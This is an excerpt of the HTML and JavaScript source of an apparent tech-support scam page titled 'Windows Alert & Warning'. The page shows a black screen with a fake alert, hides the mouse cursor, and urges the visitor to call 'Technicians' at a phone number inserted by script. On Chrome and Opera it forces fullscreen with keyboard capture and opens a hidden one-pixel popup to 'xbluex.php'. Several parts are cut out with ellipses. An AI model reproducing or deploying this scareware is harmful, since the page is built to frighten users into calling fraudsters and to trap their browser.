...
<head>
    ...
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Windows Alert & Warning</title>
    <meta name="robots" content="NOINDEX,NOFOLLOW">
    <style type="text/css">
        #alert{position:absolute;left:30%;top:5%;background:#000000  ;border:2px solid #0032C7;width:40%}.input{margin-top:10px;background:#000000  ;padding:20px;text-align:right}.input input{opacity:1;padding:15px;font-size:16px;width:35%;font-weight:700}.input input:hover{opacity:.75}.head h1,h2,h3,h4{margin:0;padding:0}.text{padding:20px}.right{float:right}.left{float:left}.clear{clear:both}.alert_hide{cursor:pointer}body{background-color:#000000  ;color:#000;font-family:"Trebuchet MS",Arial,Helvetica,sans-serif;font-family:Arial;font-size:18px;margin:0}body,html{margin:10px;padding:0;overflow:hidden;width:100%;height:100%;background-attachment:fixed;background-color:#000000  }
    </style>
...
<body style="margin:0px;padding:0px;font-family:arial,sans-serif!important;  background-color: #000000   !important; cursor: url(&quot;data:image/png;base64,&quot;) 128 128, crosshair;" id="mycanvas">
    ...
    <div style="width:95%; margin:auto; padding-top:4%; background: url(windows.png) no-repeat 100% 30% #000000  ;position:relative;">
        <div class="centering-col">
            <div class="centered-content">

                <h1 style="color:#FFF; margin-top:20px; font-weight:900;">Windows Alert & Warning</h1>
           ...
           <br/>
                ...
                <div style=" margin-top:400px; ">
                    <h2 style=" font-weight:900;color:#FFFFFF;">Call Technicians : <script>document.write("<span style=\"color:#FFFFFF\">" + phone + "<\/span> (Helpline)")</script> </h2></div>
    ...
    <script>
        ...
        $(function() {
          ...
          if (isChrome || isOpera) {
              ...
              function m() {
                  document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || (document.documentElement.requestFullscreen ? document.documentElement.requestFullscreen() : document.documentElement.mozRequestFullScreen ? document.documentElement.mozRequestFullScreen() : document.documentElement.webkitRequestFullscreen && document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)), window.open("xbluex.php", "Alert", "width=1,height=1,scrolling=yes,fullscreen=yes,left=3000,top=3000")
              }
